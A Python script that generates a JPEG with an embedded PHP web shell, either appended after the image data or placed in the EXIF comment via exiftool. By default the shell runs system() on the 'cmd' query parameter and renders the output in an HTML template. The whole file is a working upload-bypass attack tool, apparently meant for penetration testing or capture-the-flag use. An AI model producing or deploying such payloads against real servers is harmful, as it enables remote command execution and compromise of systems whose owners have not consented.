import io
import logging
import tempfile
import argparse
import subprocess
from pathlib import Path

from PIL import Image


logging.basicConfig(
    format="[%(levelname)s]\t%(filename)s:%(lineno)d - %(funcName)s - %(message)s"
)

DEFAULT_TEMPLATE = \
"""
<div style="background:#f4f4f4;color:#333;padding:10px;font-family:monospace;font-size:14px;">
  <strong>Command executed:</strong><br>
  <pre style="background:#1e1e1e;color:#f5f5f5;padding:10px;border-radius:4px;overflow:auto;">{{COMMAND}}</pre>
  <br>
  <strong>Command output:</strong><br>
  <pre style="background:#1e1e1e;color:#f5f5f5;padding:10px;border-radius:4px;overflow:auto;">{{OUTPUT}}</pre>
</div>
"""


def parse_command_line_arguments() -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        description="Generate a JPG image with embedded PHP payload."
    )
    parser.add_argument("-t", "--template", help="Path to custom template file.")
    parser.add_argument("-c", "--command", help="Linux command to embed within the template.", default="$_GET['cmd']")
    parser.add_argument("-s", "--size", nargs=2, type=int, metavar=("WIDTH", "HEIGHT"), default=(100, 100),
        help="Image size as width height (default: %(default)s)")
    parser.add_argument("-o", "--output", help="Path to the output file", required=True)
    parser.add_argument("-x", "--use-exiftools", action="store_true",
        help="If specified, exiftools will be used for payload embedding.")

    return parser.parse_args()


def load_template(template_path: Path) -> str:
    return template_path.read_text(encoding="utf-8")


def raise_error_if_template_misses_placeholders(template: str) -> None:
    for placeholder in ["{{COMMAND}}", "{{OUTPUT}}"]:
        if placeholder not in template:
            raise ValueError(f"Template must contain {placeholder}")


def populate_template(template: str, command: str) -> str:
    return template \
        .replace("{{COMMAND}}", f"<?php echo htmlspecialchars({command}); ?>") \
        .replace("{{OUTPUT}}", f"<?php system('{command}'); ?>")


def create_in_memory_jpeg(size: tuple[int, int]) -> bytes:
    with io.BytesIO() as buf:
        Image.new("RGB", size, "white").save(buf, format="JPEG")
        return buf.getvalue()


def embed_with_exiftool(image_data: bytes, payload: str, output_file_path: Path) -> None:
    with tempfile.NamedTemporaryFile(suffix=".jpg") as tmp_file:
        tmp_img_path = Path(tmp_file.name)
        tmp_img_path.write_bytes(image_data)

        subprocess.run(
            [
                "exiftool",
                f"-Comment={payload}",
                "-overwrite_original",
                "-o", str(output_file_path),
                str(tmp_img_path)
            ],
            check=True
        )


def embed_inline(image_data: bytes, payload: str, output_file_path: Path) -> None:
    output_file_path.write_bytes(image_data + b"\n" + payload.encode("utf-8"))


def main() -> None:
    args = parse_command_line_arguments()

    template = load_template(Path(args.template)) if args.template else DEFAULT_TEMPLATE
    raise_error_if_template_misses_placeholders(template)

    (embed_with_exiftool if args.use_exiftools else embed_inline)(
        image_data=create_in_memory_jpeg(args.size),
        payload=populate_template(template, args.command),
        output_file_path=args.output
    )


if __name__ == "__main__":
    main()
